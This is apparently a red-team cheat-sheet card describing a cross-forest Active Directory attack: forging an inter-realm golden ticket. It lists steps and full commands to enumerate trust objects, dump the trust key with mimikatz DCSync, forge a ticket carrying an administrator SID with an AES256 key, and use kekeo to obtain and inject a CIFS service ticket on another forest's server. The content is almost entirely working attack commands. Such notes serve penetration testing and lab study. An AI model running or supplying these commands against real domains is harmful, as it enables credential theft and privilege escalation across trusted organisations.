# 14.10 Inter-Realm Golden Ticket Cross-Forest

> Forge an inter-realm referral ticket with the AES256 trust key (dumped via `lsadump::dcsync /guid`), then `kekeo` for cross-forest TGS.

## Overview

The existing card shows the final mimikatz command but is missing context. This is the CVE-2020-0665 prerequisite step and also the Trust Account Attack endpoint. Forge an inter-realm referral ticket for logistics.ad using the AES256 trust key obtained via mimikatz lsadump::dcsync /guid, then use kekeo to request a TGS for a specific service on a target server in the trusted forest.

## Steps

- Enumerate trust object GUIDs with **Get-ADObject -LDAPFilter '(objectClass=trustedDomain)'**
- Dump inter-realm keys with **mimikatz lsadump::dcsync /guid:{...}**
- Forge inter-realm ticket with **mimikatz kerberos::golden /target /service:krbtgt /aes256**
- Use **kekeo tgs::ask** to get a service ticket for a specific host using the inter-realm ticket

## Commands

### Enumerate trust GUID

```powershell
PS C:\Tools> Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid
```

### Dump inter-realm keys

```powershell
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"
```

### Forge inter-realm ticket

```powershell
mimikatz # kerberos::golden /domain:<DOMAIN>.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /user:user1 /target:logistics.ad /service:krbtgt /sids:S-1-5-21-2327345182-1863223493-3435513819-500 /aes256:179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8
```

### Request service ticket with kekeo

```powershell
kekeo # tgs::ask /tgt:ticket.kirbi /service:cifs/[email protected] /kdc:DC02.logistics.ad /ptt
```
